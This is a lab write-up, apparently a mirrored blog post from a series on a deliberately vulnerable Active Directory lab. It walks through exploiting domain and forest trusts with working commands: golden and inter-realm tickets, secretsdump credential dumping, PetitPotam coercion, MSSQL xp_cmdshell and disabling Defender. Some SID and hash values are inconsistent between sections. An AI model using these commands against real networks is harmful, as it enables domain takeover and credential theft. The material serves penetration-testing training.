> [!NOTE]
> Original post can be found here:
> https://mayfly277.github.io/posts/GOADv2-pwning-part12/

On the previous post we tried some attacks path with ACL. This post will be on escalation with domain trust (from child to parent domain) and on Forest to Forest trust lateral move.

The forest trust exploitation as already been very well covered by harmjOy on [this link](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d), i recommend you to read :)

# Goad upgrade

>[!NOTE]
>Current version includes this


- To simplify the trust exploitation in the lab i have done some small changes.
    
- A new group DragonRider on sevenkingdoms.local

```    
sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-data.yml -l dc01
```

- Change groupe AcrossTheNarrowSea acl to add genericAll on dc01 (kingslanding)

```
sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-acl.yml -l dc01
```

- Add builtin administrator user member on dc01 for dragonRider

```
sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-relations.yml -l dc01
```

- Add sidhistory on the sevenkingdoms trust link to essos by default

```
sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook vulnerabilities.yml -l dc01
```

The last one is to allow sid history and it is just like this command : 

# Enumerate Trust

- Let’s enumerate the trusts:
```
ldeep ldap -u tywin.lannister -p 'powerkingftw135' -d sevenkingdoms.local -s ldap://192.168.56.10 trusts

ldeep ldap -u tywin.lannister -p 'powerkingftw135' -d sevenkingdoms.local -s ldap://192.168.56.12 trusts
```
![screenshot](pics/ldeep_trust.png)
![screenshot](pics/ldeep_trust2.png)


- The sevenkingdoms to essos trust link is `FOREST_TRANSITIVE | TREAT_AS_EXTERNAL` due to Sid history enabled
- The essos to sevenkingdoms trust link is just `FOREST_TRANSITIVE`
    
- The corresponding ldap query is : `(objectCategory=trustedDomain)`
    
- We can observe this with bloodhound too (button map domain trusts)

```
MATCH p = (:Domain)-[:SameForestTrust|CrossForestTrust]->(:Domain)
RETURN p
LIMIT 1000
```
![screenshot](pics/map_trust.png)

- We can see
    - A domain bi-directional trust between north.sevenkingdoms.local and sevenkingdoms.local (Child / parent relation)
    - A forest bi-directional trust between essos.local and sevenkingdoms.local

# Domain Trust - child/parent (north.sevenkingdoms.local -> sevenkingdoms.local)

- Ok now imagine you have pwn the domain north.sevenkingdoms.local you have dump the ntds and you got all the NT hash of all the north domain users.

> As said by Microsoft the domain trust is not a security boundary

## RaiseMeUp - Escalate with impacket raiseChild

- To escalate from child to parent the simplest way is with impacket raiseChild.py script, this will do all the work for us.

```
impacket-raiseChild north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!' 
```
![screenshot](pics/raise_child_domain.png)


- This create a golden ticket for the forest enterprise admin.
- Log into the forest and get the target info (default administrator RID: 500)
- All the job is done with one command, if you are lazy you don’t even need to understand x)

## Golden ticket + ExtraSid

- We have done the exploitation on one command with impacket raiseChild.py, now let’s just do the same but step by step and create the golden ticket.
- Full explanation on the attack can be found here : [https://adsecurity.org/?p=1640](https://adsecurity.org/?p=1640)
- First dump the krbtgt of the domain we own
```
# dump child ntds and get krbtgt NT hash
impacket-secretsdump -just-dc-user north/krbtgt 
north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'@192.168.56.11
```
![screenshot](pics/krbtgt.png)


- Now get the child and parent domain SID
```
# dump child domain SID 
impacket-lookupsid  -domain-sids north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'@192.168.56.11 0
```
![screenshot](pics/lookupsid1.png)

```
# dump parent domain SID 
impacket-lookupsid  -domain-sids north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'@192.168.56.10 0
```
![screenshot](pics/lookupsid2.png)


- And now create the golden ticket : we add “-519” at the end of the extra-sid (means enterprise admin) (list of domain SID here : [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers))
```
impacket-ticketer -nthash ddf0463a1b031dad76011cb4611fe798 -domain-sid S-1-5-21-3063484405-1734582374-3186417267 -domain north.sevenkingdoms.local -extra-sid S-1-5-21-400042831-3601909111-1956920762-519 goldenuser
```
![screenshot](pics/creat_golden_ticket.png)


- And we use the ticket to dump the parent domain NTDS
```
export KRB5CCNAME=./goldenuser.ccache

impacket-secretsdump -k -no-pass -just-dc-ntlm  north.sevenkingdoms.local/goldenuser@kingslanding.sevenkingdoms.local
```
![screenshot](pics/secretdump_golden_ticket.png)


## Trust ticket - forge inter-realm TGT

- Another way to escalate from child to parent is by extracting the trust key and use it to create our trust ticket (a very good explanation and examples with Mimikatz can be found here : [https://adsecurity.org/?p=1588](https://adsecurity.org/?p=1588))
    
- The trust key can be found by targeting the netbios name of the domain on the ntds
    
```
impacket-secretsdump -just-dc-user 'SEVENKINGDOMS$' north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'@192.168.56.11
```
![screenshot](pics/secretdump_sevenkingdom.png)


- Now we got the trust key we can forge the ticket just like we done with the krbtgt user hash but this time we will set the spn : krbtgt/parent_domain
```
impacket-ticketer -nthash 0c4268c05b1fd45176eeae4545abdca9 -domain-sid S-1-5-21-3063484405-1734582374-3186417267 -domain north.sevenkingdoms.local -extra-sid S-1-5-21-400042831-3601909111-1956920762-519 -spn krbtgt/sevenkingdoms.local trustfakeuser
```
![screenshot](pics/trustfakeuser.png)


- Now we will use the forged TGT to ask a ST on the parent domain
```
export KRB5CCNAME=./trustfakeuser.ccache  
impacket-getST -k -no-pass -spn cifs/kingslanding.sevenkingdoms.local sevenkingdoms.local/trustfakeuser@sevenkingdoms.local -debug
```
![screenshot](pics/getST_trustfakeuser.png)


- And now we can use our service ticket :)
- connect with smbclient
```
export KRB5CCNAME=
impacket-smbclient -k -no-pass trustfakeuser@kingslanding.sevenkingdoms.local
```
![screenshot](pics/golden_ticket_smbclient.png)


- or even dump secrets
```
impacket-secretsdump -k -no-pass -just-dc-ntlm trustfakeuser@kingslanding.sevenkingdoms.local
```
![screenshot](pics/golden_ticket_secretdump.png)

> This technique is even working if krbtgt password as been changed 2 times !

## Unconstrained delegation

- As winterfell is a domain controler, by default it is configured with unconstrained delegation.
- This attack from child to parent domain with Unconstrained delegation has been done in part 10 ([delegations](https://mayfly277.github.io/posts/GOADv2-pwning-part10/)).
- The principe is simple, coerce the parent dc to an unconstrained delegation server and extract the tgt.

# Forest Trust (sevenkingdoms.local -> essos.local)

- We have done Child to parent domain, in the next part we will try to exploit forest to forest.

## Password reuse

- On a real environment this is really accurate. Dump the ntds of the domain you own and try to find the same users on the external forest domains.
- The lab didn’t have this behavior but it is really simple to exploit.

## Foreign group and users

- On bloodhound we can see very easily that there is link between the domains with the following query _(Careful this query is fine in a lab but this will certainly be a little too heavy in a real world AD)_
```
MATCH p = (a:Domain)-[:Contains*1..]->(x)-->(w)-->(z)<--(y)<-[:Contains*1..]-(b:Domain) where (x:Container or x:OU) and (y:Container or y:OU) and (a.name <>b.name) and (tolower(w.samaccountname) <> "enterprise admins" and tolower(w.samaccountname) <> "enterprise key admins" and tolower(z.samaccountname) <> "enterprise admins" and tolower(z.samaccountname) <> "enterprise key admins")  RETURN p
```
![screenshot](pics/domain_paths.png)


- On the GOAD lab you will find some specifics groups to pass from one domain to the other.

> Note that bloodhound also have buttons to research foreign groups and users directly in the interface.

- As you already have done the acl part previously you will easily find the way to exploit that. (shadow credentials/target kerberoasting/change password/…), but since it is cross domain we will do the first :)
    
- Sevenkingdoms to essos : group spys
    

- To do that just pick a user from the small council (by example petyer.baelish:@littlefinger@) and exploit with the spy group
```
net rpc password jorah.mormont 'P@ssword123' -U sevenkingdoms.local/petyer.baelish%@littlefinger@ -S meereen.essos.local
```

- And verify
```
nxc smb 192.168.56.12 -u jorah.mormont -p 'P@ssword123' -d essos.local
```
 ![screenshot](pics/change_pw_jorah.png)
 

- We can also to that with shadow credentials (but the auto will not work here, we will have to do that with two steps)
```
certipy-ad shadow add -u petyer.baelish@sevenkingdoms.local -p '@littlefinger@' -dc-ip 192.168.56.12 -target meereen.essos.local -account 'jorah.mormont'
```
![screenshot](pics/certipy1.png)

>[!NOTE] 
>Did not work, investigate why


```
certipy auth -pfx jorah.mormont.pfx -username jorah.mormont -domain essos.local -dc-ip 192.168.56.12
```


- Essos to sevenkingdoms : group accros_thenarrowsea

In the same way we can exploit the essos to sevenkingdoms foreign group

> Please not that the active directory groups are not all the same. There is 3 types of security groups: [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)
> 
> - Universal
> - Global
> - Domain Local
> 
> If a group contains members of a trusted domain, it have to be of type Domain Local.
> 
> Groups scope informations are well explained by harmj0y [here](https://posts.specterops.io/a-pentesters-guide-to-group-scoping-c7bbbd9c7560)

## Use unconstrained delegation

- From kingslanding we can rule the essos domain with unconstrained delegation
    
- We connect to kingslanding with rdp as an administrator
```
xfreerdp3 /d:sevenkingdoms.local /u:cersei.lannister /p:'il0vejaime' /v:192.168.56.10 /size:80%  /cert:ignore /drive:test,/home/kali/Desktop/htb/GOAD/tools /clipboard
```    
- For more simplicity we will disable defender
- Now we launch [rubeus.exe](https://github.com/GhostPack/Rubeus) to wait for a TGT of the essos forest.
```
.\Rubeus.exe monitor /filteruser:MEEREEN$ /interval:1
```

- And we run petitpotam on our linux console to force a coerce of meereen to kingslanding.
```
petitpotam.py -u arya.stark -p Needle -d north.sevenkingdoms.local kingslanding.sevenkingdoms.local meereen.essos.local
```

- And we get the TGT of meereen !

- Now we can copy it to linux (delete space and \n)
- Decode the base64 and save it to a kirbi file
```
base64 -d rubeus.b64 > meereen.kirbi
```

- Convert it to ccache and use it to dcsync essos.local
```
impacket-ticketConverter meereen.kirbi meereen.ccache 

export KRB5CCNAME=./meereen.ccache

impacket-secretsdump -k -no-pass -just-dc-ntlm essos.local/'MEEREEN$'@meereen.essos.local
```
![screenshot](pics/secretdump_unconstraint.png)

## Mssql Trusted link

- The MSSQL trust link is across forest, so it can be used to make forest to forest exploitation.
- Example was done in part 7 but let’s redo this for fun :
    
- Connect to the mssql DB as jon.snow
```
impacket-mssqlclient -windows-auth north.sevenkingdoms.local/jon.snow:iknownothing@castelblack.north.sevenkingdoms.local
```

- enumerate the mssql trusted links
```
enum_links
```

- And now use the link from castelblack (north domain) to braavos (essos domain)
```
use_link BRAAVOS
enable_xp_cmdshell
xp_cmdshell whoami
```
![screenshot](pics/msql_connection.png)


- Because the link use sa as remote login on braavos we can enable cmd and launch command.

## Golden ticket with external forest, sid history ftw ( essos -> sevenkingdoms)

> This attack can be done only because SID history is enabled on the sevenkingdoms->essos trust

- Find the domain sid with lookupsid.py
    - essos SID : S-1-5-21-400042831-3601909111-1956920762
    - sevenkingdoms SID: S-1-5-21-400042831-3601909111-1956920762
- Like before extract the krbtgt hash
```
impacket-secretsdump -just-dc-user 'essos/krbtgt' essos.local/daenerys.targaryen:'BurnThemAll!'@192.168.56.12
```
![screenshot](pics/scretsdum_daenerys.png)
- hash e5c36594381cbcc8902bf689994171b8

- We need a group to target on the extra-sid with an RID > 1000 due to SID filter ([see Microsoft documentation about sid filtering](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280?redirectedfrom=MSDN))

> About sid filtering dirkjanm say on his [blog](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/) : _“What this does mean for an attacker is that you can spoof any RID >1000 group if SID history is enabled across a Forest trust!”_

- The group dragonrider is a perfect match (on a real audit exchange groups are usualy a good target)

- Create the golden ticket for a fake user
```
impacket-ticketer -nthash e58cf01ba6cc645da9f7ab1f28fc3934 -domain-sid S-1-5-21-400042831-3601909111-1956920762 -domain essos.local -extra-sid S-1-5-21-400042831-3601909111-1956920762-1132 dragon
```
![screenshot](pics/ticket_dragon.png)

>[!NOTE] 
>Did not work, investigate why

- And use it (secretsdump will work too)
```
export KRB5CCNAME=./dragon.ccache
impacket-smbexec.py -k -no-pass dragon@kingslanding.sevenkingdoms.local -debug
```

>[!NOTE]
>Need to check this part

## Trust ticket with external forest ( essos -> sevenkingdoms)

- Excatly like we done before on domain forest we can do this on external forest but just like with the golden ticket we need the sid history enabled to exploit.
    
- Find the domain sid with lookupsid.py
    
    - essos SID : S-1-5-21-2203133648-1386395927-1390703624
    - sevenkingdoms SID: S-1-5-21-1409754491-4246775990-3914137275
```
secretsdump -just-dc-user 'SEVENKINGDOMS$' essos.local/daenerys.targaryen:'BurnThemAll!'@192.168.56.12
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:285b80ddc1ad529f27403804e75a9ab1:::....
```

- Create the inter-realm tgt ticket

```
ticketer.py -nthash 285b80ddc1ad529f27403804e75a9ab1 \
-domain-sid S-1-5-21-2203133648-1386395927-1390703624 \
-domain essos.local \
-extra-sid S-1-5-21-1409754491-4246775990-3914137275-1132 \
-spn krbtgt/sevenkingdoms.local trustdragon
```

- Ask a service ticket for kingslanding cifs

```
export KRB5CCNAME=/workspace/trusts/external/trustdragon.ccache
getST.py -k -no-pass -spn cifs/kingslanding.sevenkingdoms.local \
 sevenkingdoms.local/trustdragon@sevenkingdoms.local -debug
 ```

- And enjoy (secretsdump will work too)

```
export KRB5CCNAME=/workspace/trusts/external/trustdragon@sevenkingdoms.local.ccache
smbexec.py -k -no-pass trustdragon@kingslanding.sevenkingdoms.local -debug
```

## Exploit acl with external trust golden ticket

- Ok now imagine we want to exploit this acl from essos:

> By now i didn’t found a nice way to do this from linux, but from windows it is pretty easy

- Connect as administrator on meereen, disable the antivrius to be able to use mimikatz and powerview
- Create the golden ticket with mimikatz matching the group kingsguard (RID 1130)
```
mimikatz # kerberos::golden /user:guard /domain:essos.local /sid:S-1-5-21-2203133648-1386395927-1390703624 /krbtgt:e58cf01ba6cc645da9f7ab1f28fc3934 /sids:S-1-5-21-1409754491-4246775990-3914137275-1130 /ptt
```

- And now use powerview to change stannis password
```
Import-Module .\powerview.ps1<br>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force<br>Set-DomainUserPassword -Identity stannis.baratheon -AccountPassword $SecPassword -Domain sevenkingdoms.local
```

- And it work !

- And if we look at the created tickets with klist:
    - Server: krbtgt/essos.local @ essos.local (golden ticket)
    - Server: krbtgt/SEVENKINGDOMS.LOCAL @ ESSOS.LOCAL (kdc: meereen) (tgt inter realm)
    - Server: ldap/kingslanding.sevenkingdoms.local @ SEVENKINGDOMS.LOCAL (kdc: kingslanding)
    - Server: ldap/kingslanding.sevenkingdoms.local/sevenkingdoms.local @ SEVENKINGDOMS.LOCAL (kdc: kingslanding)

# The end - Winter is coming

- The GOAD’s writeups series end with this part. If you read all you are very brave and i hope you enjoyed it despite my terrible english ^^
- I also hope you gived a try to the lab and all is working fine on your computer.
- For the next year i have other evolution of the lab, blog post ideas and projects in mind, you will see it on twitter (@M4yFly) when something new will come.
- Again thank you to all the security researchers and opensource contributors for all the work and share they do !

# Resources

- [https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d)
- [https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
- [https://adsecurity.org/?p=1640](https://adsecurity.org/?p=1640)
- [https://adsecurity.org/?p=1588](https://adsecurity.org/?p=1588)
- [https://github.com/fortra/impacket/blob/master/examples/raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py)
- [https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)
- [https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/](https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/)